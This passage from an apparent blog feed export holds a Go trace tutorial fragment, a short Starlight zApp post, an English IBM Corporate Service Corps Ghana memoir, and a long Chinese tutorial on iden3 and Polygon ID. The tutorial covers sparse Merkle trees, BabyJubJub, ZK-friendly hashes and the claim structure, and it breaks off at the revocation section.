<p>第五步：查看trace的信息，在谷歌浏览器中输入<br><img src="/2018/06/07/go-pprof-trace%E5%AE%8C%E6%95%B4%E6%93%8D%E4%BD%9C/3.png"></p>
<p>然后等一会儿，再输入<br><img src="/2018/06/07/go-pprof-trace%E5%AE%8C%E6%95%B4%E6%93%8D%E4%BD%9C/4.png"></p>
<p>当然期间也可以手动gc。在程序运行的地方自动生成一个文件<br><img src="/2018/06/07/go-pprof-trace%E5%AE%8C%E6%95%B4%E6%93%8D%E4%BD%9C/5.png"></p>
<p>在cmd中输入 go tool trace    trace.out(具体路径)<br><img src="/2018/06/07/go-pprof-trace%E5%AE%8C%E6%95%B4%E6%93%8D%E4%BD%9C/6.png"></p>
<p>它会生成一个URL 地址，使用谷歌浏览器打开即可<br><img src="/2018/06/07/go-pprof-trace%E5%AE%8C%E6%95%B4%E6%93%8D%E4%BD%9C/7.png"><br><img src="/2018/06/07/go-pprof-trace%E5%AE%8C%E6%95%B4%E6%93%8D%E4%BD%9C/8.png"></p>
]]></content>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>starlight试用</title>
    <url>/2021/06/23/starlight%E8%AF%95%E7%94%A8/</url>
    <content><![CDATA[<p><a href="https://github.com/EYBlockchain/starlight">EYBlockchain/starlight: solidity –&gt; zApp transpiler (github.com)</a></p>
<p>​    zApps 是零知识应用程序。 它们就像 dApp（去中心化应用程序），但具有隐私性。 zApp 编写起来很棘手，但 Solidity 合约编写起来很可爱。 那么为什么不尝试用 Solidity 编写一个 zApp 呢？</p>
<p>starlight帮助开发人员做到这一点：</p>
<ul>
<li>编写 Solidity 合约</li>
<li>在合约中添加一些新的隐私装饰器（以获得“Zolidity”合约）</li>
<li>运行 zappify</li>
<li>作为回报，获得一个完全可用的 zApp</li>
<li>Solidity 合约 –&gt; Zolidity 合约 –&gt; zappify –&gt; zApp</li>
</ul>
<p>此转译器的主要目标是使开发人员能够快速为 zApps 起草框架。</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>remebering csc days</title>
    <url>/2010/11/07/remebering-csc-days/</url>
    <content><![CDATA[<p>Sitting at my desk back in my office during my lunch break, I started to reminisce about my month long stay in Ghana with my 10 IBM colleagues – now my close friends. One week ago we were in Accra, the capital, preparing for our press conference, dressed in our business best (and the ladies looked amazing). Our goal for the press conference was to state what we had achieved for Ghana and our clients during our short stay. Five of us summarized the projects we worked on and the tangible deliverables in addition to the intangible short, medium, and long-term goals we left for our Ghanaian colleagues to achieve. It was the three client’s statements that really made us all realize the positive impact we had made – how much we had done for them in 16 working days, how we’ve shown them that when focused on a common set of goals, great things can be accomplished in a very short time. We all hope the excitement and drive we were able to share continues and the pace of success remains steady. </p>
<p>29 days earlier eleven of us from all over the world landed in Accra – all IBMers but strangers nonetheless. We came from very diverse cultural and business backgrounds yet we all shared similar interests: the love of travel, the openness to new cultures, the joy of laughter and friendships, and the love of family and friends back home. Though our business skills were also diverse, we have core similarities there as well: we are all driven to achieve, we all have excellent problem solving skills, we all have great soft skills, and we all have excellent time management skills. We work hard, and we play hard – I guess that’s the IBM way.</p>
<p>As the working days passed, the eleven of us became as close as family. We leaned on each other for support and wisdom; we celebrated each others’ successes and embraced each others’ challenges. We shared outstanding experiences touring Ghana and learning about its people and the growing economy. We realized how special this program was to us and our clients. Many of us shared stories where our clients first realized we were strangers when we started this assignment; they thought we had been working together for years. I don’t know how our team mates were selected, but I commend whomever it was that put the 11 of us together – it was perfect.</p>
<p><img src="/2010/11/07/remebering-csc-days/1.jpg"></p>
<p>As my last post to this blog, I just want to let anybody that is considering joining the IBM Corporate Service Corps know that they absolutely should do it. You will grow in many ways, both personally and professionally. On the professional side, how often do you get the chance to work on a two or three person team where your project deliverables will help shape a growing economy? How often do you get the business opportunity to lead such positively impacting projects? How often do your clients become great friends where they start telling you they’ll miss you 5 days before the project is over? It’s a life-changing experience, do it, and thank IBM while you’re at it.</p>
]]></content>
      <tags>
        <tag>CSC</tag>
        <tag>Ghana</tag>
      </tags>
  </entry>
  <entry>
    <title>iden3和polygonID原理应用和实战</title>
    <url>/2023/11/15/iden3%E5%92%8CpolygonID%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8%E5%92%8C%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<p>学习笔记 ==&gt; <a href="https://www.youtube.com/watch?v=4ENECj3Jw24&amp;t=1s">https://www.youtube.com/watch?v=4ENECj3Jw24&amp;t=1s</a><br>原本协议连接 ==&gt; <a href="https://docs.iden3.io/protocol/spec/">https://docs.iden3.io/protocol/spec/</a></p>
<h1 id="Round0-简介"><a href="#Round0-简介" class="headerlink" title="Round0: 简介"></a>Round0: 简介</h1><p>本文将由浅入深地解读Iden3项目，希望读者读完后，完全理解 iden3的原理和did的精髓，并能够上手使用Iden3开发项目。为什么要做一次Iden3的介绍？笔者很早就研究过did协议，也做过一些粗浅的开发，但是这次使用iden3开发了一整套应用，期间被迫把几乎所有文档和代码都反复研读了几遍。过程虽然痛苦，但对did的理解变得深刻了许多。因此，向各位做一次分享汇报，同时也作为自己的学习笔记。由于脑子一直不太好使，难免有理解的不到位的地方，还希望各位多多交流。</p>
<h1 id="Round1-应用"><a href="#Round1-应用" class="headerlink" title="Round1: 应用"></a>Round1: 应用</h1><h2 id="背景：什么是DID"><a href="#背景：什么是DID" class="headerlink" title="背景：什么是DID"></a>背景：什么是DID</h2><p>Iden3是一套Did协议的实现，允许使用者使用其提供的sdk构建did应用，并满足w3c did标准的基本语义，包括可验证声明、选择性披露等。如果您不熟悉did协议，可以参考w3c did协议，Dapp Learning也做过相关的讲解，可以参考。如果您没有时间阅读did的知识，就目前而言，您只需要记住如下几个要点：</p>
<ul>
<li>did包括三个角色：issuer，holder，verifier。</li>
<li>issuer负责分发claim给holder，claim里面包含各种holder的信息，换言之记录了“谁有什么属性”。例如，issuer如果是政府机构对的话，claim则可以是身份证，上面记录了姓名、证件号码、出生日期等描述公民的信息；而holder则看作公民，verifier可以是机关单位、商业场所等，他们可以要求公民提供证件的有效信息。</li>
<li>当claim可以向holder提供关于自己claim数据的证明，一方面证明自己确实拥有issuer提供的claim，一方面证明claim满足某些条件。这种证明也被称为credential。出于隐私保护的要求，credential通常具有选择性披露性质，只证明自己持有必要的属性，例如最经典的，仅根据身份证上的出生日期，判定自己大于18岁。</li>
<li>issuer、holder、verifier之间使用公钥来认证彼此。这个公钥存储在did doc中，而did doc将锚定到去中心化设施上。最简单的理解方式是认为did doc存储在链上，尽管实际上一般是链下存储具体数据，链上存摘要的形式。<br><img src="/2023/11/15/iden3%E5%92%8CpolygonID%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8%E5%92%8C%E5%AE%9E%E6%88%98/1.png"><br>在iden3中，支持了上述流程，并且还支持claim的撤销、更新，身份的注销等能力。本文会逐步揭开它们的运行原理。<br>（注：注意到图中的trust，verifier需要相信那个公钥确实是issuer的。比如我要验证你的学历，那么对于签署它的私钥，我必须相信这个密钥确实是那所学校签发的，这个流程才算圆满。但任何人都可以发放claim，verifier怎么知道发放的人确实是那个issuer呢？我称之为元信任问题。你可以说通过上一级权威机构以类似证书的形式构建，但再上一级呢，最终的信任（称之为元信任）。元信任在现实中还有社会关系、权威作为其土壤，但在赛博空间，元信任该如何建立呢，靠信誉系统，还是共识呢？这个问题一直困扰我，但不作为本文的重点。）</li>
</ul>
<h2 id="应用体验：PolygonId"><a href="#应用体验：PolygonId" class="headerlink" title="应用体验：PolygonId"></a>应用体验：PolygonId</h2><p>目前，基于Did协议构建的最典型应用是polygon id，根据官网的描述，它将是polygon接下来要主推的产品。用户可以访问它的test版本，在上面方便地注册、分发凭证。本文以polygon ID为例，讲解iden3的架构。</p>
<h3 id="注册issuer"><a href="#注册issuer" class="headerlink" title="注册issuer"></a>注册issuer</h3><p>首先点开polygon platform：<a href="https://devs.polygonid.com/docs/quick-start-demo/">https://devs.polygonid.com/docs/quick-start-demo/</a>, <a href="https://user-ui:password-ui@issuer-ui.polygonid.me/schemas">https://user-ui:password-ui@issuer-ui.polygonid.me/schemas</a></p>
<h3 id="Issuer创建schema"><a href="#Issuer创建schema" class="headerlink" title="Issuer创建schema"></a>Issuer创建schema</h3><p>进去后，我们准备颁发一个claim。首先创建一个schema，它表达了claim的格式，即claim应该存哪些字段，字段分别是什么数据类型。换言之，它是一个模板。我们创建一个简单的Schema。<br><img src="/2023/11/15/iden3%E5%92%8CpolygonID%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8%E5%92%8C%E5%AE%9E%E6%88%98/2.png"><br>注意，这里面数据类型目前只有三种：数值、布尔、日期。如果用户想使用字符串等复杂数据，可将所需数据编码成数值后再存储。创建后的Schema，会生成json ld文件，用户可以点击schema后在右侧弹出的地方找到link下载这个json ld。它描述了Schema的格式。</p>
<h3 id="Issuer创建Credentials"><a href="#Issuer创建Credentials" class="headerlink" title="Issuer创建Credentials"></a>Issuer创建Credentials</h3><p>我们重点关心红色框内部的信息，id和type表示存储这两样信息，id表示字段的名称为role，type表示该字段存储在凭证的哪个插槽。这涉及到了claim的存储结构，我们后文会详细描述，大家只需要知道，claim可看作容量为8的数组，有8个插槽。有些插槽是存储特定信息的，例如claim的属主，claim遵循的格式、过期日期等元数据；有些则是为用户预留的，用户可以指定某个属性存储到哪个插槽中。</p>
<p>定义好claim后，我们来实例化一个具体的claim。此时我们还不知道接受者的did是多少，因此无法真正创建凭证。此时，我们创建的是一个Credentials，只有当后面holder来领取了这个Credentials，才会真正生成claim。这个Credentials里面填入了具体的字段，完成了Credentials的创建。<br>注意到，点击我们创建的Credentials后，右侧会有一个Details - QR code link，issuer可以用任何形式把这个link告知给holder，让holder来领取Credentials。</p>
<h3 id="Holder领取Claim"><a href="#Holder领取Claim" class="headerlink" title="Holder领取Claim"></a>Holder领取Claim</h3><p>如果说platform 是issuer的主场，那么polygon ID钱包就是holder的主场。holder打开polygon ID，先生成自己的did。然后，holder用pc打开issuer分发给他的链接，这个链接里面包含了一个二维码。<br>接下来，holder用钱包来扫码，然后claim就生成了。在内部，钱包实际上是把自己的did发送给了platform，并附带来证明——这类似于输入自己用户名和密码，只不过完全基于密码学技术，一方面保护了holder的公钥等信息，另一方面还很自动化。</p>
<h3 id="Holder创建Proof"><a href="#Holder创建Proof" class="headerlink" title="Holder创建Proof"></a>Holder创建Proof</h3><p>好吧，polygon Id钱包目前不知道什么情况，至少笔者使用的版本没有找到构造proof的方法。不过笔者项目开发过程中，重新实现了整套polygon id，包括钱包，并自行实现了这套功能。</p>
<p>至此，本文已经演示完了polygon ID的基本用法，如果您想了解这其中幕后发生的事情，则接下来将开始介绍iden3的知识。</p>
<h1 id="Round2-概念"><a href="#Round2-概念" class="headerlink" title="Round2: 概念"></a>Round2: 概念</h1><p>在我们先前对polygon ID的演示中，已经接触了Iden3的核心概念：schema，claims。现在来更详细的介绍一些基本知识。</p>
<h2 id="密码学组件"><a href="#密码学组件" class="headerlink" title="密码学组件"></a>密码学组件</h2><p>在开始之前，先介绍一些iden3采用的基本密码学组件。这里不会介绍它们的具体实现和参数，具体内容我会在参考文档中给出。只会介绍它们的特性。</p>
<h3 id="Sparse-Merkle-Tree"><a href="#Sparse-Merkle-Tree" class="headerlink" title="Sparse Merkle Tree"></a>Sparse Merkle Tree</h3><p>经典的merkle tree，被用来证明某样数据是存在的，只要Verifier能将Prover提供的证明（绿色部分）重新合成的根，和可信树根一致，就可以证明Prover真的持有对应叶子结点（红色部分）：<br><img src="/2023/11/15/iden3%E5%92%8CpolygonID%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8%E5%92%8C%E5%AE%9E%E6%88%98/3.png"><br>但是，Merkle Tree是高度浓缩的，它的叶子结点是已存在的数据的集合。但若想证明一个数据是不存在的，使用Merkle Tree就无法处理了，就需要引入merkle tree的变种——Sparse Merkle Tree，它构建于数据空间，每一个数据单元既可以有数据，也可以没有数据；而若要证明一条数据不存在，只需要提供这条代表“不存在”的数据的merkle proof即可：<br><img src="/2023/11/15/iden3%E5%92%8CpolygonID%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8%E5%92%8C%E5%AE%9E%E6%88%98/4.png"></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;context&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;math/big&quot;</span></span><br><span class="line">    merkletree <span class="string">&quot;github.com/iden3/go-merkletree-sql&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/iden3/go-merkletree-sql/db/memory&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sparse MT</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    ctx := context.Background()</span><br><span class="line">    <span class="comment">// Tree storage</span></span><br><span class="line">    store := memory.NewMemoryStorage()</span><br><span class="line">    <span class="comment">// Generate a new MerkleTree with 32 levels</span></span><br><span class="line">    mt, _ := merkletree.NewMerkleTree(ctx, store, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add a leaf to the tree with index 1 and value 10</span></span><br><span class="line">    index1 := big.NewInt(<span class="number">1</span>)</span><br><span class="line">    value1 := big.NewInt(<span class="number">10</span>)</span><br><span class="line">    mt.Add(ctx, index1, value1)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add another leaf to the tree</span></span><br><span class="line">    index2 := big.NewInt(<span class="number">2</span>)</span><br><span class="line">    value2 := big.NewInt(<span class="number">15</span>)</span><br><span class="line">    mt.Add(ctx, index2, value2)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Proof of membership of a leaf with index 1</span></span><br><span class="line">    proofExist, value, _ := mt.GenerateProof(ctx, index1, mt.Root())</span><br><span class="line">    fmt.Println(<span class="string">&quot;Proof of membership:&quot;</span>, proofExist.Existence)</span><br><span class="line">    fmt.Println(<span class="string">&quot;Value corresponding to the queried index:&quot;</span>, value)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Proof of non-membership of a leaf with index 4</span></span><br><span class="line">    proofNotExist, _, _ := mt.GenerateProof(ctx, big.NewInt(<span class="number">4</span>), mt.Root())</span><br><span class="line">    fmt.Println(<span class="string">&quot;Proof of membership:&quot;</span>, proofNotExist.Existence)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Sparse Merkle Tree的实现稍复杂一些，涉及到节点的动态更新等，细节读者可自行查阅资料。从模型上来讲，却很简单。Sparse Merkle Tree构建于“存储空间”之上。我们可以先想象出一个“存储空间”，每个存储单元对应一个递增编号。进程地址空间就是这样一个例子。接下来，相邻两个存储单元开始向上构建merkle tree，所得到的就是Sparse Merkle Tree。假如我想证明这个存储格子没有存储任何信息，那么先根据格子的编号找到存储内容，它的值为0；然后无脑构建merkle proof即可。也就是说，证明一个数据不存在，只要证明对应叶子结点值为0即可。</p>
<p>anyway，只需要记住：<strong>Sparse Merkle Tree可以证明数据不存在，在iden3中，claim的撤销、私钥更换、身份的撤销等神奇功能就依赖于这个技术。</strong></p>
<h3 id="BabyJubJub-Key"><a href="#BabyJubJub-Key" class="headerlink" title="BabyJubJub Key"></a>BabyJubJub Key</h3><p>Iden3中，公私钥用于认证消息是否为对应did所发。Iden3采用了BabyJubJub曲线，而没有采用经典的secp256k1等曲线，因为BabyJubJub对zksnark很友好，这也是EIP-2494中推荐在circuits中使用的曲线，它的素数域是BN254的群阶。BabyJubJub曲线是SafeCurves工程的成果。该团队在设置了一组安全系数情况下，对BN254作为“主曲线”上进行派生，得到了的一条满足安全要求的曲线。另外，Zcash基于同样的原理（但是不同的p）构造了其他的JubJub曲线，也具有类似的效果。</p>
<p>就笔者个人经验来看，使用Babyjubjub体制的密码学，确实在构造电路方面节省的多，笔者在这次项目中尝试使用0xParc的ECDSA来构造一些基本的签名验证电路，约束多达数百k，跑个groth16的trusted setup都要几天几夜；相比之下，跑一个BabyJubjub体制下的电路，则2w约束不到。</p>
<p>为什么存在这样的差异呢，我们先要了解基础知识：</p>
<ul>
<li>椭圆曲线本质是构建于素域Fp的加法循环群，点的加法离不开对p求模。例如扭曲爱德华曲线的点加法：<br><img src="/2023/11/15/iden3%E5%92%8CpolygonID%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8%E5%92%8C%E5%AE%9E%E6%88%98/5.png"></li>
<li>验证签名操作重度依赖于点加法，因此也就重度依赖于求模。</li>
<li>zksnark中，加法门、乘法门的操作，都是素域Fp上的带模操作，模为BN254曲线的阶(21888242871839275222246405745257275088548364400416034343698204186575808495617)</li>
</ul>
<p>那么为什么babyjubjub造出来的电路约束这么少，比secp256k1少了整个量级，就是因为对求模的处理方式不同。如果我们想在zksnark做求模，有两种做法，一种自己在电路中实现求模，它会产生大量的电路约束。另一种是借助zksnark，不过仅限于模21888242871839275222246405745257275088548364400416034343698204186575808495617。如果你想对这个数取模，只需要正常做加法和乘法即可，求模操作是zksnark自带的，并不会产生额外的约束。</p>
<p>所以，产生约束数目的差异就很好解释了。secp256k1中，模p和zksnark自带的p是不一样的，那么只能自己在电路里生成模操作。<strong>但是babyjubjub的p，刚好和zksnark的p相同（它们都等于alt_bn128曲线的群阶），这就允许zksnark在处理bjj的求模操作时不必再去做取模操作，取模会在计算见证时自动完成</strong>。这就好比你写solidity验签时，利用以太坊的预编译合约做验签名，肯定比用纯solidity实现验签要高效。如果我们查看babyjjubjub的代码，也可以印证这一点，它做的是扭曲爱德华曲线的点加法，但是无需任何求模：<br><a href="https://github.com/iden3/circomlib/blob/master/circuits/eddsa.circom">https://github.com/iden3/circomlib/blob/master/circuits/eddsa.circom</a><br>抛开这些内容，我们只需要知道，<strong>BabyJubJub是众多明星项目心仪的曲线，对zk十分友好，也兼具安全性和效率即可</strong>。如果想详细阅读相关资料，推荐阅读如下几篇材料：</p>
<p><a href="https://z.cash/technology/jubjub/">https://z.cash/technology/jubjub/</a><br><a href="https://eips.ethereum.org/EIPS/eip-2494#specificationhttps://github.com/iden3/iden3-docs/blob/master/source/docs/Baby-Jubjub.pdf">https://eips.ethereum.org/EIPS/eip-2494#specificationhttps://github.com/iden3/iden3-docs/blob/master/source/docs/Baby-Jubjub.pdf</a></p>
<h3 id="对Zk友好的哈希"><a href="#对Zk友好的哈希" class="headerlink" title="对Zk友好的哈希"></a>对Zk友好的哈希</h3><p>在zksnark中，经常用到的哈希包括Poseidon Hash，Pederson Hash，MiMc Hash。它们都很常见，也出现在iden3的circomlib中，不过Poseidon Hash是Iden3项目主打的哈希方案。介绍它们的算法细节有点超出本文的内容了，也超出了我的能力。只粗浅的谈几点原理，权当茶余饭后的谈资：</p>
<h3 id="Pederson"><a href="#Pederson" class="headerlink" title="Pederson"></a>Pederson</h3><p>把域上的两个元素作为输入，结合椭圆曲线上的若干生成元，进行标量乘，得到的新曲线点的横坐标，这就是哈希的结果。换言之，记得公式公钥E = dG吧，Pederson Hash可看成这个公式的高配版。它的特点是同态性和隐私性。<br>对于我们开发者而言，除了了解它的输入输出和大致原理，还需要知道一点：circomlib的实现中，曲线采用了Baby Jub Jub，即省去了取模的约束。<br>设 G 和 H 是椭圆曲线上的两个生成点，而 x 和 y 是要哈希的两个不同的输入值。Pedersen 哈希的表达式可以表示为：Hash(x,y)=xG+yH<br>在这里，xG 和 yH 表示椭圆曲线上的标量乘法操作，结果 Hash(x,y) 是曲线上的另一个点，作为哈希值。特别地，其Pederson hash还依赖了Baby Jub Jub，就避免了生成求模相关的约束。</p>
<h3 id="PoseidonHash"><a href="#PoseidonHash" class="headerlink" title="PoseidonHash"></a>PoseidonHash</h3><p>Poseidon Hash很容易和Pederson Hash搞混，尽管原理完全不同。它也是一种对ZK友好的哈希算法，并被Iden3中广泛的使用。提出于2020年。根据<a href="https://eprint.iacr.org/2019/458.pdf">论文</a>和一些文章，它的约束数目要比Pederson Hash要节省8倍之多，对于PLONK还有据说40倍的提高。首先它基于海绵函数构造，在这个构造中，消息被分解为若干份，第一份消息和最左侧白色的状态的r部分进行异或， 所得结果和剩余的c部分一起进入函数f，生成新的状态，如此一轮一轮的操作，直到生成出结果。<br>而Poseidon Hash中，特别的设置了三个函数用于每一轮的操作。</p>
<ol>
<li><strong>初始化（Initialisation）</strong>：选择一组初始参数（如有限域、初始状态等）。</li>
<li><strong>多轮置换（Permutation）</strong>：使用特定的非线性函数（通常是“S-Box”，如乘方或立方）以及线性混合层对输入进行多次置换和混合。</li>
<li><strong>输出（Extraction）</strong>：在完成所有置换后，从最终状态中提取输出哈希值。</li>
</ol>
<p><strong>在Iden3中，大量的使用到了poseidon hash，无论是merkle tree，还是claim，还是身份状态。</strong></p>
<h3 id="Mimc"><a href="#Mimc" class="headerlink" title="Mimc"></a>Mimc</h3><p>Mimic也是一种面向zk设计的轻量级哈希，它只由加法和乘法构成，并且可以抵抗碰撞。它的结构上很简单，也是一轮一轮的处理，每一轮都根据输入i，密钥k，常数集合c来计算输出（即图中的➕）：</p>
<p>MiMC 的一个典型数学表达式是基于有限域上的幂次运算。对于一个输入 x 和密钥 k，MiMC 哈希的一个简化版本可以表示为：<br><img src="/2023/11/15/iden3%E5%92%8CpolygonID%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8%E5%92%8C%E5%AE%9E%E6%88%98/6.png"></p>
<p>在这里：</p>
<ul>
<li>x 是输入值。</li>
<li>k 是密钥。</li>
<li>e 是一个大的素数，用于幂次运算。</li>
<li>p 是一个大的素数，定义了运算所在的有限域。</li>
<li>\mod 表示模运算。</li>
</ul>
<p>MiMC 之所以特别，是因为它的设计目标是在保持足够安全性的同时，最小化乘法运算的复杂度。<br>而对于我们开发者，只要知道，选好一个mimc算法，给定输入，配好一个轮数（印象里Dark Forest中选择了Feistel，并配置220），就可以得到输出。</p>
<p>anyway，我们只要记住：<a href="https://github.com/iden3/circomlib">iden3的circomlib实现了上述全部算法</a>，甚至连变种也实现了；而且它们都是面向zk的哈希。而iden3本身则重度依赖poseidonHash。至于上述3个的特性如何，细节的原理是什么，哪个更安全，哪个更节省约束，为什么存在这种差异，超出了我的能力，请咨询群内大佬。</p>
<h2 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h2><p>现在开始，正式介绍Iden3的基本概念。如果理解了前面的内容，这部分会理解的很快。这一部分中，我们还是先不介绍具体的流程、动作是怎么实现的，而是先介绍幕后的东西，在文章结尾，会把本文的内容整合起来，彻底还原出整个系统是如何运作的。</p>
<h3 id="Schema"><a href="#Schema" class="headerlink" title="Schema"></a>Schema</h3><p>格式前文已经介绍过，它定义了一个claim应遵守的格式，包括每个字段的名称，属性，存储插槽。此外，每个Schema还会生成哈希。</p>
<h3 id="Claim-存储结构"><a href="#Claim-存储结构" class="headerlink" title="Claim 存储结构"></a>Claim 存储结构</h3><p>Claim表示声明，上面记录了某did具有的属性有哪些。claim用中文应该叫声明，而不是凭证（credentials），这是两个不同的概念，声明代表数据，凭证代表证明。</p>
<p>Claim由8个数据插槽构成，每个插槽包含了253位。前4个插槽，被称作“索引槽位”，原文IndexSlots，分别记为i0~i3。后4个插槽，被称作“值槽位”，原文ValueSlots。分别记为v0～v3。Claim的8个槽位，将按照下面的方式构建成merkle tree：<br><img src="/2023/11/15/iden3%E5%92%8CpolygonID%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8%E5%92%8C%E5%AE%9E%E6%88%98/7.png"><br>前文提到过，一个Sparse Merkle Tree，它的叶子节点是一个带编号的存储单元，而每个claim都会存储到特定的存储单元中，存储单元的编号，就是claim那4个索引槽位的哈希Hi。换言之，Hi相当于是claim的id，因此为你的应用去设计Claim格式的时候，<strong>尽量在索引槽位里面存储能够唯一化标记这个claim的数据</strong>。例如，如果想做电子身份证，那么身份证号可以放在索引位，像住址等可以放在值槽位；另一方面，一定要避免两个Claim出现相同的Hi，不然发行、接受claim的时候，总是会报Sparse Merkle Tree的duplicate entry错误。这类似于，我们要存储[学生，班级]这个数据，那么应该以学生作为Hi，而不能以班级作为Hi，不然就会出现Hi的冲突。</p>
<p><a href="https://github.com/iden3/js-iden3-core/blob/main/src/claim.ts#L17C1-L17C2">下图是槽位布局的介绍</a>：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Claim structure</span><br><span class="line"></span><br><span class="line">Index:</span><br><span class="line"> i_0: [ 128  bits ] claim schema</span><br><span class="line">      [ 32 bits ] option flags</span><br><span class="line">          [3] Subject:</span><br><span class="line">            000: A.1 Self</span><br><span class="line">            001: invalid</span><br><span class="line">            010: A.2.i OtherIden Index</span><br><span class="line">            011: A.2.v OtherIden Value</span><br><span class="line">            100: B.i Object Index</span><br><span class="line">            101: B.v Object Value</span><br><span class="line">          [1] Expiration: bool</span><br><span class="line">          [1] Updatable: bool</span><br><span class="line">          [3] Merklized: data is merklized root is stored in the:</span><br><span class="line">            000: none</span><br><span class="line">            001: C.i Root Index (root located in i_2)</span><br><span class="line">            010: C.v Root Value (root located in v_2)</span><br><span class="line">          [<span class="number">24</span>] <span class="number">0</span></span><br><span class="line">      [ 32 bits ] version (optional?)</span><br><span class="line">      [ 61 bits ] 0 - reserved for future use</span><br><span class="line"> i_1: [ 248 bits] identity (case b) (optional)</span><br><span class="line">      [  <span class="number">5</span> bits ] <span class="number">0</span></span><br><span class="line"> i_2: [ 253 bits] 0</span><br><span class="line"> i_3: [ 253 bits] 0</span><br><span class="line">Value:</span><br><span class="line"> v_0: [ 64 bits ]  revocation nonce</span><br><span class="line">      [ 64 bits ]  expiration date (optional)</span><br><span class="line">      [ 125 bits] 0 - reserved</span><br><span class="line"> v_1: [ 248 bits] identity (case c) (optional)</span><br><span class="line">      [  <span class="number">5</span> bits ] <span class="number">0</span></span><br><span class="line"> v_2: [ 253 bits] 0</span><br><span class="line"> v_3: [ 253 bits] 0</span><br></pre></td></tr></table></figure>

<ul>
<li>i_0：存储元数据。包括如下信息：<ul>
<li>claim schema：凭证schema的哈希，后面电路验证特定claim时，会去校验这个字段，例如对于记录公钥的auth claim，就要强行验证其等于”304427537360709784173770334266246861770”:</li>
<li>Subject：数据主体类型。如果留空，就表示发放给自己的，像auth claim（记录了公钥），就记录了issuer自己的公钥，自己发放给自己即可。如果这个值是010，就表示这个claim是描述其他did的，具体的did则存储在i_1槽位。如果是011，也表示这个claim是描述其他did的，但是did存储在i_0槽位。</li>
<li>version：版本号信息，对claim的更新操作需要用到。</li>
<li>Expiration、updatable等：略</li>
</ul>
</li>
<li>i_1: 存储数据主体的did。（如果i0中Subjuject部分设为010）</li>
<li>i_2～i_3:留给用户使用。</li>
<li>v_0：存储元数据。包括如下信息：<ul>
<li>revocation nonce：每个claim都具有一个独特的revocation nonce，是实现claim撤销的关键。</li>
<li>expiration date：claim过期日期。</li>
</ul>
</li>
<li>v_1：储数据主体的did。（如果i0中Subject部分设为011）</li>
<li>v_2~v_3：留给用户使用。</li>
</ul>
<p>这部分结构可能把大家绕晕了，那么换一种角度来理解它，就容易多了。假设我们是一所高校，现在我们要给学生颁发学生证，有效期为4年。假设此时已经是iden3的世界了，无论是学校还是学生，都有自己的did。那么典型地，凭证很可能长这样：</p>
<ul>
<li>i_0的Subject部分设为010，表示这个claim是描述一个holder，而不是issuer自身<ul>
<li>Expiration：设为true，因为4年就过期了。</li>
<li>i_1的identity部分，设为学生的did。</li>
</ul>
</li>
<li>i_2～i_3：存放学校的名字，学生的其他信息等。注意，能用的空间很有限，只有i_2，i_3，v_2，v_3，请妥善使用空间。</li>
<li>v_0的expiration date：设为未来4年。</li>
</ul>
<p>综上，我们已经在狭小的存储空间内，填上了“学生”“学校名字”“毕业年份”这几样关键信息。</p>
<p>也许读者会问，学校或单位颁发的证件，都会有一个盖章，对应到did中，不应该还有一个签名，或者issuer的did吗？如果没有这个信息，我作为验证者，我怎么知道你这个claim到底属于谁呢？请继续往下阅读，一步步揭开如何验证声明的有效性。</p>
<h3 id="auth-claim"><a href="#auth-claim" class="headerlink" title="auth claim"></a>auth claim</h3><p>在w3c did doc中，要求存储did的公钥。那么在iden3中，公钥会存储到auth claim中。auth claim是用户状态的一部分，最终会绑定到区块链上（即Issuer点击Publish issuer state时）。</p>
<h3 id="Identity"><a href="#Identity" class="headerlink" title="Identity"></a>Identity</h3><p>从技术角度来看，一个身份包括三棵树：claims tree，revocation tree，roots of roots tree。<br><img src="/2023/11/15/iden3%E5%92%8CpolygonID%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8%E5%92%8C%E5%AE%9E%E6%88%98/8.jpg"></p>
<h3 id="claims树"><a href="#claims树" class="headerlink" title="claims树"></a>claims树</h3><p>对于claims树而言，它包含了两类claim：自己作为issuer发给别人的claim，和作为holder所领取的claim。这是因为在Iden3的设计哲学中，身份包括两个基本的方面：我说出去的话，和别人对我说的话。这些claim均嵌入到claims树的叶子中。当zk verifier想要验证一个claim的有效性的时候，会验证claim存储在holder的claims tree中。</p>
<p>因此在开发的过程中，不管是holder还是issuer，都不得不去自己保存claim的原文。</p>
<h3 id="revocation树"><a href="#revocation树" class="headerlink" title="revocation树"></a>revocation树</h3><p>claim的撤销是个很常见的功能，例如学校可以开除学生，并把他的学生证无效化。笔者这次开发的项目中，也用到了撤销功能，有一个功能点就是我们自己复刻的增强版polygonID，会去访问knn3的数据源，一旦检测到holder在链上的数据已经不达标，则自动撤销。</p>
<p>现在请大家思考一个问题：作为一个issuer，给holder发放了一个claim，这个claim就流到了holder的手中，直觉上issuer就失去了对这个claim的控制权。那么issuer如何将其撤销呢？</p>
